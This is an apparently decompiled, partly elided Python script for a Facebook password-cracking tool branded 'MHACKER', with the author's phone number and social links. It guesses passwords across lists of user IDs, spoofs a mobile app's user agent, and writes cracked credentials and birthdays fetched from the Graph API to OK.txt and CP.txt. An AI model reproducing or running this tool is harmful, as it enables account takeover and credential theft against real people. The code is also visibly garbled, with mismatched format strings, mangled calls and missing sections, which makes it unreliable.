# decoder by cobra linux commands _Tool Owner MafiyaHacker
# https://github.com/Mafiyahunter/MHacker.git
# Python 3.11 ___WhatsApp +919971945685
...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							SOURAV_MHACKER('[•] Result CP saved to CP.txt')
							SOURAV_MHACKER('\n\tCrack Processing...\n')
							SOURAV_MHACKER('\n\tCrack Processing...\n\n');logo()
			...
			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			SOURAV_MHACKER(' [1] MHACKER Method 1 ')
			SOURAV_MHACKER(' [2] MHACKER Method 2  [ Pro ]')
			SOURAV_MHACKER(' [3] MHACKER Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [MHACKER] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				ua_xiaomi = SOURAV_MHACKER('agent.txt', 'r').read()
			...
			if "access_token" in p:
				SOURAV_MHACKER('\r\033[1;92m[Successful-MHACKER] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = MHACKER('login.txt').read()
					cp_ttl = Prof_Imtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					SOURAV_MHACKER('\r\033[1;91m[Checkpoint-MHACKER] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				SOURAV_MHACKER('\r\033[1;91m[Checkpoint-MHACKER] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				ua_xiaomi = MAFIYA('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			...
			if 'c_user' in ses.cookies.get_dict():
				SOURAV_MHACKER('\r\033[1;32m[Successful-MHACKER] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = MHACKER('token.txt').read()
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].SOURAV_MHACKER('\r\033[1;91m[Checkpoint-MHACKER] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				ua_xiaomi = SOURAV('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			ses = requests.Session()
			...
			if 'c_user' in ses.cookies.get_dict():
				SOURAV_MHACKER('\r\033[1;92m[Successful-MHACKER] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = SOURAV('token.txt').read()
					cp_ttl = Prof_Mhacker('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					SOURAV_MHACKER('\r\033[1;91m[Checkpoint-MHACKER] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
...
banner="""\033[1;37m
 ...
 [*]=============================================
    Author   : MAFIYA HUNTER
    Facebook : https://www.facebook.com/profile.php?id=100066332015845
    Team     : MAFIYA+TOM
    Connect  : +919971945685
 [*]=============================================
...
def dupcutter():
	os.system("xdg-open https://wa.me/+919971945685")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
	os.system("xdg-open https://youtube.com/@kinggamer3437")
	time.sleep(3)
	readline___Public_Xml()
